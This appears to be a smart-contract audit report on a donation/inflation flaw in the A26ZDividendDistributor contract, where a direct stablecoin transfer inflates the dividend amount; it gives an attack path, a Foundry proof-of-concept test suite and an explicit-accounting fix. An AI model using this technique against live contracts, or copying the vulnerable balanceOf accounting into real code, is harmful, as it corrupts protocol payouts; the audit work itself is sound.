# [000701] Donation/Inflation Attack in A26ZDividendDistributor Allows Manipulation of Dividend Distribution
  
  ### Summary

The use of `stablecoin.balanceOf(address(this))` in `_setAmounts()` to determine the dividend distribution amount will cause accounting manipulation and loss of control for the protocol owner as any attacker can send stablecoins directly to the contract to inflate `stablecoinAmountToDistribute` before `setUpTheDividends()` is called.


### Root Cause


In [A26ZDividendDistributor.sol:207-209](https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/A26ZDividendDistributor/A26ZDividendDistributor.sol#L207-L209) the `_setAmounts()` function uses `stablecoin.balanceOf(address(this))` to determine how much stablecoin should be distributed as dividends:

```solidity
function _setAmounts() internal {
    stablecoinAmountToDistribute = stablecoin.balanceOf(address(this));
    totalUnclaimedAmounts = getTotalUnclaimedAmounts();
    emit amountsSet(stablecoinAmountToDistribute, totalUnclaimedAmounts);
}
```

This is a mistake because anyone can send tokens directly to the contract via `transfer()`, artificially inflating the balance. The contract has no way to distinguish between intentionally deposited dividends and externally donated tokens.


### Internal Pre-conditions

1. Owner needs to deploy `A26ZDividendDistributor` with valid vesting, NFT, and stablecoin contracts
2. Owner needs to transfer stablecoins to the contract intending to distribute a specific amount as dividends
3. TVS holders need to exist with unclaimed token allocations (for dividends to be calculated)

### External Pre-conditions

None required - the attack can be executed by anyone at any time.


### Attack Path

1. Owner transfers 10,000 USDC to `A26ZDividendDistributor` intending to distribute this amount as dividends
2. Attacker observes the owner's transaction in the mempool (or simply monitors the contract balance)
3. Attacker front-runs or executes before `setUpTheDividends()` by calling `stablecoin.transfer(distributorAddress, 90000e6)` to send 90,000 USDC directly to the contract
4. Owner calls `setUpTheDividends()` which internally calls `_setAmounts()`
5. `_setAmounts()` reads `stablecoin.balanceOf(address(this))` which now equals 100,000 USDC (10k + 90k)
6. `stablecoinAmountToDistribute` is set to 100,000 USDC instead of the intended 10,000 USDC
7. Dividends are calculated and distributed based on the inflated 100,000 USDC amount
8. TVS holders can claim 10x more dividends than the owner intended


### Impact

The protocol owner loses control over the dividend distribution amount. The attacker loses their donated funds (90,000 USDC in the example) which get distributed to TVS holders - this is a griefing attack rather than theft.

Specific impacts:
- Loss of control: Owner cannot reliably set a specific dividend distribution amount
- Accounting corruption: Protocol's dividend accounting becomes unreliable and manipulable
- Griefing potential: Attacker can force unintended distributions by donating tokens
- If attacker is a TVS holder: They can partially recoup their donation through their share of the inflated dividends, though they still incur a net loss unless they own 100% of TVS positions

The attacker loses their entire donation amount. TVS holders receive inflated dividends (benefiting from the attack).

### PoC

Save this POC to `protocol/test/C05_DonationInflationAttack.t.sol`.

Run with:
```bash
cd protocol && forge test --match-contract C05_DonationInflationAttackTest -vv
```

### POC Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.29;

import "forge-std/Test.sol";
import {A26ZDividendDistributor} from "../src/contracts/A26ZDividendDistributor/A26ZDividendDistributor.sol";
import {Aligners26} from "../src/contracts/token/Aligners26.sol";
import {MockUSD} from "../src/MockUSD.sol";
import {IAlignerzVesting} from "../src/interfaces/IAlignerzVesting.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

contract MockVestingForDividendTest {
    mapping(uint256 => IAlignerzVesting.Allocation) public allocations;
    uint256 public totalMinted;

    function setAllocation(
        uint256 nftId,
        uint256[] memory amounts,
        uint256[] memory vestingPeriods,
        uint256[] memory vestingStartTimes,
        uint256[] memory claimedSeconds,
        bool[] memory claimedFlows,
        address tokenAddr
    ) external {
        allocations[nftId].amounts = amounts;
        allocations[nftId].vestingPeriods = vestingPeriods;
        allocations[nftId].vestingStartTimes = vestingStartTimes;
        allocations[nftId].claimedSeconds = claimedSeconds;
        allocations[nftId].claimedFlows = claimedFlows;
        allocations[nftId].token = IERC20(tokenAddr);
        if (nftId >= totalMinted) {
            totalMinted = nftId + 1;
        }
    }

    function allocationOf(uint256 nftId) external view returns (IAlignerzVesting.Allocation memory) {
        return allocations[nftId];
    }
}

contract MockNFTForDividendTest {
    mapping(uint256 => address) public owners;
    uint256 public totalMinted;

    function setOwner(uint256 tokenId, address owner) external {
        owners[tokenId] = owner;
        if (tokenId >= totalMinted) {
            totalMinted = tokenId + 1;
        }
    }

    function extOwnerOf(uint256 tokenId) external view returns (address) {
        require(owners[tokenId] != address(0), "Token does not exist");
        return owners[tokenId];
    }

    function getTotalMinted() external view returns (uint256) {
        return totalMinted;
    }
}

contract VulnerableDividendDistributor is Ownable {
    using SafeERC20 for IERC20;

    struct Dividend {
        uint256 amount;
        uint256 claimedSeconds;
    }

    uint256 public startTime;
    uint256 public vestingPeriod;
    uint256 public totalUnclaimedAmounts;
    uint256 public stablecoinAmountToDistribute;

    MockVestingForDividendTest public vesting;
    MockNFTForDividendTest public nft;
    IERC20 public stablecoin;
    IERC20 public token;

    mapping(address => Dividend) public dividendsOf;
    mapping(uint256 => uint256) public unclaimedAmountsIn;

    constructor(
        address _vesting,
        address _nft,
        address _stablecoin,
        uint256 _startTime,
        uint256 _vestingPeriod,
        address _token
    ) Ownable(msg.sender) {
        vesting = MockVestingForDividendTest(_vesting);
        nft = MockNFTForDividendTest(_nft);
        stablecoin = IERC20(_stablecoin);
        startTime = _startTime;
        vestingPeriod = _vestingPeriod;
        token = IERC20(_token);
    }

    function setUpTheDividends() external onlyOwner {
        _setAmounts();
        _setDividends();
    }

    function claimDividends() external {
        address user = msg.sender;
        uint256 totalAmount = dividendsOf[user].amount;
        uint256 claimedSecs = dividendsOf[user].claimedSeconds;
        uint256 secondsPassed;
        if (block.timestamp >= vestingPeriod + startTime) {
            secondsPassed = vestingPeriod;
            dividendsOf[user].amount = 0;
            dividendsOf[user].claimedSeconds = 0;
        } else {
            secondsPassed = block.timestamp - startTime;
            dividendsOf[user].claimedSeconds += (secondsPassed - claimedSecs);
        }
        uint256 claimableSeconds = secondsPassed - claimedSecs;
        uint256 claimableAmount = totalAmount * claimableSeconds / vestingPeriod;
        stablecoin.safeTransfer(user, claimableAmount);
    }

    function _setAmounts() internal {
        stablecoinAmountToDistribute = stablecoin.balanceOf(address(this));
        totalUnclaimedAmounts = _getTotalUnclaimedAmounts();
    }

    function _getTotalUnclaimedAmounts() internal returns (uint256 total) {
        uint256 len = nft.getTotalMinted();
        for (uint256 i; i < len; i++) {
            try nft.extOwnerOf(i) returns (address) {
                total += _getUnclaimedAmounts(i);
            } catch {}
        }
    }

    function _getUnclaimedAmounts(uint256 nftId) internal returns (uint256 amount) {
        IAlignerzVesting.Allocation memory alloc = vesting.allocationOf(nftId);
        if (address(token) != address(alloc.token)) return 0;

        uint256 len = alloc.amounts.length;
        for (uint256 i; i < len; i++) {
            if (alloc.claimedFlows[i]) continue;
            if (alloc.claimedSeconds[i] == 0) {
                amount += alloc.amounts[i];
                continue;
            }
            uint256 claimedAmt = alloc.claimedSeconds[i] * alloc.amounts[i] / alloc.vestingPeriods[i];
            amount += alloc.amounts[i] - claimedAmt;
        }
        unclaimedAmountsIn[nftId] = amount;
    }

    function _setDividends() internal {
        uint256 len = nft.getTotalMinted();
        for (uint256 i; i < len; i++) {
            try nft.extOwnerOf(i) returns (address owner) {
                if (totalUnclaimedAmounts > 0) {
                    dividendsOf[owner].amount += (unclaimedAmountsIn[i] * stablecoinAmountToDistribute / totalUnclaimedAmounts);
                }
            } catch {}
        }
    }
}

contract C05_DonationInflationAttackTest is Test {
    VulnerableDividendDistributor public distributor;
    MockVestingForDividendTest public mockVesting;
    MockNFTForDividendTest public mockNft;
    Aligners26 public token;
    MockUSD public stablecoin;

    address public owner;
    address public attacker;
    address public victim1;
    address public victim2;
    address public victim3;

    uint256 constant OWNER_INTENDED_DEPOSIT = 10_000e6;
    uint256 constant ATTACKER_DONATION = 90_000e6;
    uint256 constant TOKEN_ALLOCATION = 1000 ether;
    uint256 constant VESTING_PERIOD = 90 days;

    function setUp() public {
        owner = address(this);
        attacker = makeAddr("attacker");
        victim1 = makeAddr("victim1");
        victim2 = makeAddr("victim2");
        victim3 = makeAddr("victim3");

        token = new Aligners26("A26Z Token", "A26Z");
        stablecoin = new MockUSD();

        mockVesting = new MockVestingForDividendTest();
        mockNft = new MockNFTForDividendTest();

        distributor = new VulnerableDividendDistributor(
            address(mockVesting),
            address(mockNft),
            address(stablecoin),
            block.timestamp,
            VESTING_PERIOD,
            address(token)
        );

        stablecoin.mint(owner, OWNER_INTENDED_DEPOSIT * 2);
        stablecoin.mint(attacker, ATTACKER_DONATION);

        _setupAllocationsForVictims();
    }

    function _setupAllocationsForVictims() internal {
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = TOKEN_ALLOCATION;

        uint256[] memory vestingPeriods = new uint256[](1);
        vestingPeriods[0] = VESTING_PERIOD;

        uint256[] memory vestingStartTimes = new uint256[](1);
        vestingStartTimes[0] = block.timestamp;

        uint256[] memory claimedSeconds = new uint256[](1);
        claimedSeconds[0] = 0;

        bool[] memory claimedFlows = new bool[](1);
        claimedFlows[0] = false;

        mockNft.setOwner(0, victim1);
        mockVesting.setAllocation(0, amounts, vestingPeriods, vestingStartTimes, claimedSeconds, claimedFlows, address(token));

        mockNft.setOwner(1, victim2);
        mockVesting.setAllocation(1, amounts, vestingPeriods, vestingStartTimes, claimedSeconds, claimedFlows, address(token));

        mockNft.setOwner(2, victim3);
        mockVesting.setAllocation(2, amounts, vestingPeriods, vestingStartTimes, claimedSeconds, claimedFlows, address(token));
    }

    function test_RealContract_VulnerableToBalanceInflation() public {
        A26ZDividendDistributor realDistributor = new A26ZDividendDistributor(
            address(mockVesting),
            address(mockNft),
            address(stablecoin),
            block.timestamp,
            VESTING_PERIOD,
            address(token)
        );

        stablecoin.transfer(address(realDistributor), OWNER_INTENDED_DEPOSIT);
        assertEq(stablecoin.balanceOf(address(realDistributor)), OWNER_INTENDED_DEPOSIT);

        vm.prank(attacker);
        stablecoin.transfer(address(realDistributor), ATTACKER_DONATION);

        assertEq(
            stablecoin.balanceOf(address(realDistributor)),
            OWNER_INTENDED_DEPOSIT + ATTACKER_DONATION,
            "Anyone can inflate contract balance via direct transfer"
        );

        realDistributor.setAmounts();

        assertEq(
            realDistributor.stablecoinAmountToDistribute(),
            OWNER_INTENDED_DEPOSIT + ATTACKER_DONATION,
            "CRITICAL: _setAmounts uses balanceOf which is manipulable"
        );

        uint256 inflationFactor = (realDistributor.stablecoinAmountToDistribute() * 100) / OWNER_INTENDED_DEPOSIT;
        assertEq(inflationFactor, 1000, "Distribution amount inflated by 10x");
    }

    function test_FullExploit_InflatedDividendsClaimed() public {
        stablecoin.transfer(address(distributor), OWNER_INTENDED_DEPOSIT);

        vm.prank(attacker);
        stablecoin.transfer(address(distributor), ATTACKER_DONATION);

        distributor.setUpTheDividends();

        uint256 expectedPerVictimWithoutAttack = OWNER_INTENDED_DEPOSIT / 3;
        uint256 actualPerVictim = distributor.stablecoinAmountToDistribute() / 3;

        assertEq(actualPerVictim, 33_333_333_333, "Each victim gets ~33,333 USDC instead of ~3,333 USDC");
        assertEq(actualPerVictim / expectedPerVictimWithoutAttack, 10, "Victims receive 10x more than intended");

        vm.warp(block.timestamp + VESTING_PERIOD);

        vm.prank(victim1);
        distributor.claimDividends();
        vm.prank(victim2);
        distributor.claimDividends();
        vm.prank(victim3);
        distributor.claimDividends();

        uint256 totalClaimed = stablecoin.balanceOf(victim1) + stablecoin.balanceOf(victim2) + stablecoin.balanceOf(victim3);

        assertGt(totalClaimed, OWNER_INTENDED_DEPOSIT, "Total claimed exceeds owner intended deposit");
        assertEq(totalClaimed, 99_999_999_999, "~100,000 USDC distributed instead of 10,000 USDC");
    }

    function test_OwnerLosesControlOverDistribution() public {
        VulnerableDividendDistributor cleanDistributor = new VulnerableDividendDistributor(
            address(mockVesting),
            address(mockNft),
            address(stablecoin),
            block.timestamp,
            VESTING_PERIOD,
            address(token)
        );

        stablecoin.transfer(address(cleanDistributor), OWNER_INTENDED_DEPOSIT);
        cleanDistributor.setUpTheDividends();
        uint256 intendedDistribution = cleanDistributor.stablecoinAmountToDistribute();

        stablecoin.transfer(address(distributor), OWNER_INTENDED_DEPOSIT);
        vm.prank(attacker);
        stablecoin.transfer(address(distributor), ATTACKER_DONATION);
        distributor.setUpTheDividends();
        uint256 manipulatedDistribution = distributor.stablecoinAmountToDistribute();

        assertEq(intendedDistribution, OWNER_INTENDED_DEPOSIT, "Without attack: 10,000 USDC");
        assertEq(manipulatedDistribution, OWNER_INTENDED_DEPOSIT + ATTACKER_DONATION, "With attack: 100,000 USDC");
        assertEq(
            manipulatedDistribution - intendedDistribution,
            ATTACKER_DONATION,
            "Owner lost control: attacker inflated distribution by 90,000 USDC"
        );
    }

    function test_AttackerGriefing_LosesDonatedFunds() public {
        uint256 attackerBalanceBefore = stablecoin.balanceOf(attacker);

        stablecoin.transfer(address(distributor), OWNER_INTENDED_DEPOSIT);

        vm.prank(attacker);
        stablecoin.transfer(address(distributor), ATTACKER_DONATION);

        distributor.setUpTheDividends();

        vm.warp(block.timestamp + VESTING_PERIOD);

        vm.prank(victim1);
        distributor.claimDividends();
        vm.prank(victim2);
        distributor.claimDividends();
        vm.prank(victim3);
        distributor.claimDividends();

        uint256 attackerBalanceAfter = stablecoin.balanceOf(attacker);
        uint256 attackerLoss = attackerBalanceBefore - attackerBalanceAfter;

        assertEq(attackerLoss, ATTACKER_DONATION, "Attacker loses entire 90,000 USDC donation");

        uint256 totalVictimGains = stablecoin.balanceOf(victim1) + stablecoin.balanceOf(victim2) + stablecoin.balanceOf(victim3);
        assertGt(totalVictimGains, OWNER_INTENDED_DEPOSIT, "Victims benefit from attacker's donation");
    }
}

```




### Mitigation

Use explicit accounting instead of `balanceOf`. Track deposited dividends through a dedicated deposit function:

```solidity
uint256 public pendingDividends;

function depositDividends(uint256 amount) external onlyOwner {
    stablecoin.safeTransferFrom(msg.sender, address(this), amount);
    pendingDividends += amount;
}

function _setAmounts() internal {
    stablecoinAmountToDistribute = pendingDividends;
    pendingDividends = 0;
    totalUnclaimedAmounts = getTotalUnclaimedAmounts();
    emit amountsSet(stablecoinAmountToDistribute, totalUnclaimedAmounts);
}
```

This ensures only explicitly deposited amounts are used for dividend calculations, preventing external manipulation of the distribution amount.
  